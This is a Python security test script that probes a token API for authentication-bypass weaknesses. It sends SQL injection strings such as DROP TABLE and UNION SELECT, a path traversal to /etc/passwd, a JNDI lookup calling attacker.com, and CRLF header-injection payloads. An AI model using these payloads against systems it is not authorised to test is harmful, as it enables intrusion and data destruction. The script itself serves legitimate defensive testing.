"""
Authentication Bypass Penetration Test

Tests for:
- Missing Authorization header bypass
- Malformed Bearer token bypass
- SQL injection in API key lookup
- Timing attacks on key validation
- Brute force API key enumeration
- Header injection attacks
- JWT confusion attacks (if applicable)
"""

import asyncio
import hashlib
import time
from typing import Dict, List

import httpx


class AuthBypassTests:
    """Penetration tests for authentication bypass vulnerabilities"""

    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.results: List[Dict] = []

    async def test_missing_auth_header(self) -> Dict:
        """Test if endpoints can be accessed without Authorization header"""
        print("\n[TEST] Missing Authorization Header")

        endpoints = [
            "/tokens/balance/550e8400-e29b-41d4-a716-446655440000",
            "/attributions/550e8400-e29b-41d4-a716-446655440000",
            "/tokens/ledger/550e8400-e29b-41d4-a716-446655440000",
        ]

        vulnerable = []
        async with httpx.AsyncClient() as client:
            for endpoint in endpoints:
                try:
                    response = await client.get(f"{self.base_url}{endpoint}")
                    if response.status_code == 200:
                        vulnerable.append(endpoint)
                        print(f"  ❌ VULNERABLE: {endpoint} - Returns 200 without auth")
                    elif response.status_code == 401:
                        print(f"  ✅ SECURE: {endpoint} - Returns 401 as expected")
                    else:
                        print(f"  ⚠️  UNEXPECTED: {endpoint} - Returns {response.status_code}")
                except Exception as e:
                    print(f"  ⚠️  ERROR: {endpoint} - {str(e)}")

        result = {
            "test": "missing_auth_header",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_endpoints": vulnerable,
            "severity": "CRITICAL" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_malformed_bearer_tokens(self) -> Dict:
        """Test if malformed Bearer tokens are properly rejected"""
        print("\n[TEST] Malformed Bearer Tokens")

        malformed_tokens = [
            "",  # Empty token
            "Bearer",  # Missing token part
            "bearer extro_live_test",  # Lowercase bearer
            "extro_live_test",  # Missing Bearer prefix
            "Bearer ",  # Space only
            "Bearer\nextro_live_test",  # Newline injection
            "Bearer\textro_live_test",  # Tab injection
            "Bearer extro_live_test; DROP TABLE api_keys;",  # SQL injection attempt
            "Bearer " + "A" * 10000,  # Very long token
            "Bearer ../../../etc/passwd",  # Path traversal
            "Bearer ${jndi:ldap://attacker.com/a}",  # Log4j-style injection
        ]

        vulnerable = []
        endpoint = "/tokens/balance/550e8400-e29b-41d4-a716-446655440000"

        async with httpx.AsyncClient() as client:
            for token in malformed_tokens:
                try:
                    headers = {"Authorization": token}
                    response = await client.get(f"{self.base_url}{endpoint}", headers=headers)

                    # All malformed tokens should return 401
                    if response.status_code != 401:
                        vulnerable.append(token[:50])
                        print(f"  ❌ VULNERABLE: Token '{token[:50]}...' - Returns {response.status_code}")
                    else:
                        print(f"  ✅ SECURE: Token rejected properly")
                except Exception as e:
                    print(f"  ⚠️  ERROR: {str(e)}")

        result = {
            "test": "malformed_bearer_tokens",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_tokens": vulnerable,
            "severity": "HIGH" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_sql_injection_in_key_lookup(self) -> Dict:
        """Test SQL injection vulnerabilities in API key validation"""
        print("\n[TEST] SQL Injection in Key Lookup")

        sql_injection_payloads = [
            "extro_live_' OR '1'='1",
            "extro_live_' OR 1=1--",
            "extro_live_' OR '1'='1' /*",
            "extro_live_'; DROP TABLE api_keys;--",
            "extro_live_' UNION SELECT * FROM users--",
            "extro_live_' AND 1=1--",
            "extro_live_' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--",
            "extro_live_admin'--",
            "extro_live_' OR EXISTS(SELECT * FROM api_keys WHERE is_revoked=false)--",
        ]

        vulnerable = []
        endpoint = "/tokens/balance/550e8400-e29b-41d4-a716-446655440000"

        async with httpx.AsyncClient() as client:
            for payload in sql_injection_payloads:
                try:
                    headers = {"Authorization": f"Bearer {payload}"}
                    response = await client.get(f"{self.base_url}{endpoint}", headers=headers)

                    # Should return 401, anything else indicates potential SQL injection
                    if response.status_code == 200:
                        vulnerable.append(payload)
                        print(f"  ❌ CRITICAL: SQL Injection possible with '{payload[:30]}...'")
                    elif response.status_code == 500:
                        vulnerable.append(payload)
                        print(f"  ❌ VULNERABLE: Server error with '{payload[:30]}...' (possible SQL error)")
                    else:
                        print(f"  ✅ SECURE: Injection rejected properly")
                except Exception as e:
                    print(f"  ⚠️  ERROR: {str(e)}")

        result = {
            "test": "sql_injection_key_lookup",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_payloads": vulnerable,
            "severity": "CRITICAL" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_timing_attack_on_validation(self) -> Dict:
        """Test for timing attack vulnerabilities in key validation"""
        print("\n[TEST] Timing Attack on Key Validation")

        endpoint = "/tokens/balance/550e8400-e29b-41d4-a716-446655440000"

        # Test with valid prefix but invalid full key
        valid_prefix_key = "extro_live_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        # Test with completely invalid key
        invalid_key = "invalid_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

        valid_prefix_times = []
        invalid_times = []

        async with httpx.AsyncClient() as client:
            # Measure timing for valid prefix (10 samples)
            for _ in range(10):
                headers = {"Authorization": f"Bearer {valid_prefix_key}"}
                start = time.perf_counter()
                try:
                    await client.get(f"{self.base_url}{endpoint}", headers=headers)
                except:
                    pass
                elapsed = time.perf_counter() - start
                valid_prefix_times.append(elapsed)

            # Measure timing for invalid key (10 samples)
            for _ in range(10):
                headers = {"Authorization": f"Bearer {invalid_key}"}
                start = time.perf_counter()
                try:
                    await client.get(f"{self.base_url}{endpoint}", headers=headers)
                except:
                    pass
                elapsed = time.perf_counter() - start
                invalid_times.append(elapsed)

        avg_valid_prefix = sum(valid_prefix_times) / len(valid_prefix_times)
        avg_invalid = sum(invalid_times) / len(invalid_times)
        time_diff = abs(avg_valid_prefix - avg_invalid)

        # If timing difference > 50ms, potential timing attack vulnerability
        vulnerable = time_diff > 0.05

        print(f"  Average time (valid prefix): {avg_valid_prefix*1000:.2f}ms")
        print(f"  Average time (invalid): {avg_invalid*1000:.2f}ms")
        print(f"  Difference: {time_diff*1000:.2f}ms")

        if vulnerable:
            print(f"  ❌ VULNERABLE: Timing difference > 50ms (potential timing attack)")
        else:
            print(f"  ✅ SECURE: Timing difference < 50ms")

        result = {
            "test": "timing_attack_validation",
            "status": "FAIL" if vulnerable else "PASS",
            "avg_valid_prefix_ms": round(avg_valid_prefix * 1000, 2),
            "avg_invalid_ms": round(avg_invalid * 1000, 2),
            "difference_ms": round(time_diff * 1000, 2),
            "severity": "MEDIUM" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_header_injection(self) -> Dict:
        """Test for HTTP header injection vulnerabilities"""
        print("\n[TEST] Header Injection")

        endpoint = "/tokens/balance/550e8400-e29b-41d4-a716-446655440000"

        header_injection_payloads = [
            "extro_live_test\r\nX-Admin: true",
            "extro_live_test\nX-Admin: true",
            "extro_live_test\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1",
        ]

        vulnerable = []

        async with httpx.AsyncClient() as client:
            for payload in header_injection_payloads:
                try:
                    headers = {"Authorization": f"Bearer {payload}"}
                    response = await client.get(f"{self.base_url}{endpoint}", headers=headers)

                    # Check if injected headers appear in response
                    if "X-Admin" in response.headers or response.status_code == 200:
                        vulnerable.append(payload[:30])
                        print(f"  ❌ VULNERABLE: Header injection possible")
                    else:
                        print(f"  ✅ SECURE: Header injection blocked")
                except Exception as e:
                    print(f"  ✅ SECURE: Exception raised (headers sanitized)")

        result = {
            "test": "header_injection",
            "status": "FAIL" if vulnerable else "PASS",
            "vulnerable_payloads": vulnerable,
            "severity": "HIGH" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def test_api_key_enumeration(self) -> Dict:
        """Test for API key enumeration via response timing or error messages"""
        print("\n[TEST] API Key Enumeration")

        endpoint = "/tokens/balance/550e8400-e29b-41d4-a716-446655440000"

        # Test if error messages leak information
        test_keys = [
            "extro_live_" + "a" * 48,  # Valid format
            "wrong_prefix_" + "a" * 48,  # Invalid prefix
            "extro_live_short",  # Too short
            "",  # Empty
        ]

        error_messages = {}

        async with httpx.AsyncClient() as client:
            for key in test_keys:
                try:
                    headers = {"Authorization": f"Bearer {key}"}
                    response = await client.get(f"{self.base_url}{endpoint}", headers=headers)

                    if response.status_code == 401:
                        try:
                            error_msg = response.json().get("detail", "")
                            error_messages[key[:20]] = error_msg
                            print(f"  Key: '{key[:20]}...' -> '{error_msg}'")
                        except:
                            pass
                except Exception as e:
                    print(f"  ⚠️  ERROR: {str(e)}")

        # Check if error messages are too specific (information leakage)
        unique_messages = len(set(error_messages.values()))
        vulnerable = unique_messages > 1

        if vulnerable:
            print(f"  ❌ VULNERABLE: Different error messages leak key validity info")
        else:
            print(f"  ✅ SECURE: Consistent error messages")

        result = {
            "test": "api_key_enumeration",
            "status": "FAIL" if vulnerable else "PASS",
            "error_messages": error_messages,
            "severity": "MEDIUM" if vulnerable else "N/A",
        }
        self.results.append(result)
        return result

    async def run_all_tests(self) -> Dict:
        """Run all authentication bypass tests"""
        print("\n" + "=" * 60)
        print("AUTHENTICATION BYPASS PENETRATION TESTS")
        print("=" * 60)

        await self.test_missing_auth_header()
        await self.test_malformed_bearer_tokens()
        await self.test_sql_injection_in_key_lookup()
        await self.test_timing_attack_on_validation()
        await self.test_header_injection()
        await self.test_api_key_enumeration()

        # Summary
        passed = sum(1 for r in self.results if r["status"] == "PASS")
        failed = sum(1 for r in self.results if r["status"] == "FAIL")

        print("\n" + "=" * 60)
        print(f"RESULTS: {passed} PASSED, {failed} FAILED")
        print("=" * 60)

        return {
            "total_tests": len(self.results),
            "passed": passed,
            "failed": failed,
            "details": self.results,
        }


if __name__ == "__main__":
    import sys

    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"

    tester = AuthBypassTests(base_url)
    results = asyncio.run(tester.run_all_tests())

    # Exit with non-zero code if any tests failed
    sys.exit(0 if results["failed"] == 0 else 1)
